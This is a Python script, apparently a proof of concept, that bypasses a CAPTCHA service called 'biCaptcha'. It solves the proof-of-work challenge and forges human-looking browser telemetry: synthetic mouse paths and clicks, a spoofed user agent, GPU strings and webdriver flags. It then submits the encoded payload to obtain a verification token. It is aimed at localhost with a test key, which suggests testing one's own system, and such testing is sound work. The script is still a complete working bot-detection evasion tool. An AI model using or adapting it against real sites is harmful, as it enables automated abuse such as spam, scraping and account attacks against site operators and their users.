import requests
import hashlib
import json
import base64
import time
import urllib.parse
import random

def solve_pow(prefix, difficulty):
    print(f"[*] Solving PoW with difficulty {difficulty}...")
    target_prefix = '0' * difficulty
    nonce = 0
    while True:
        data = (prefix + str(nonce)).encode('utf-8')
        h = hashlib.sha256(data).hexdigest()
        if h.startswith(target_prefix):
            print(f"[+] PoW solved! Nonce: {nonce} (Hash: {h})")
            return str(nonce)
        nonce += 1

def generate_fake_telemetry(pow_nonce):
    # Simulate realistic mouse movements (curved)
    mouse_movements = []
    base_time = int(time.time() * 1000) - 2000
    x, y = random.randint(10, 100), random.randint(10, 100)
    for i in range(20):
        x += random.randint(-5, 15)
        y += random.randint(-5, 15)
        mouse_movements.append([x, y, base_time + (i * 50)])

    # Simulate a realistic click
    clicks = [[
        x + random.random(), # Non-integer click
        y + random.random(),
        base_time + 1000
    ]]

    telemetry = {
        "m": mouse_movements,
        "c": clicks,
        "t": [],
        "w": 1920,
        "h": 1080,
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "l": "en-US",
        "tz": -180,
        "hc": 8,
        "dm": 8,
        "wd": False,
        "p": "Chrome PDF ViewerChromium PDF ViewerStandard",
        "glV": "Google Inc. (NVIDIA)",
        "glR": "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "cH": "abcd123",
        "err": False,
        "px": False,
        "chr": False,
        "np": False,
        "pow": pow_nonce,
        "ts": int(time.time() * 1000)
    }
    return telemetry

def bypass_bicaptcha(base_url, site_key):
    print(f"[*] Starting biCaptcha bypass for {site_key} on {base_url}")
    
    # 1. Get Challenge
    try:
        r = requests.get(f"{base_url}/api/bi-captcha/challenge?siteKey={site_key}")
        r.raise_for_status()
        challenge_data = r.json()
        print(f"[+] Challenge received: {challenge_data}")
    except Exception as e:
        print(f"[-] Failed to get challenge: {e}")
        return

    # 2. Solve PoW
    nonce = solve_pow(challenge_data['prefix'], challenge_data['difficulty'])

    # 3. Generate Fake Telemetry
    telemetry = generate_fake_telemetry(nonce)
    payload_json = json.dumps(telemetry)
    
    # URL encode and base64 (matching client side btoa(encodeURIComponent(...)))
    encoded_payload = base64.b64encode(urllib.parse.quote(payload_json).encode('utf-8')).decode('utf-8')

    # 4. Submit Verification
    print("[*] Submitting verification payload...")
    verify_data = {
        "siteKey": site_key,
        "data": encoded_payload,
        "challenge": challenge_data['prefix']
    }
    
    try:
        r = requests.post(f"{base_url}/api/bi-captcha/verify", json=verify_data)
        r.raise_for_status()
        result = r.json()
        if result.get("token"):
            print(f"[+] BYPASS SUCCESSFUL! Token: {result['token']}")
        else:
            print(f"[-] Verification failed: {result}")
    except requests.exceptions.HTTPError as e:
        print(f"[-] HTTP Error: {e.response.text}")
    except Exception as e:
        print(f"[-] Verification failed: {e}")

if __name__ == "__main__":
    TARGET_URL = "http://localhost:3000"
    SITE_KEY = "test-site-key"
    bypass_bicaptcha(TARGET_URL, SITE_KEY)
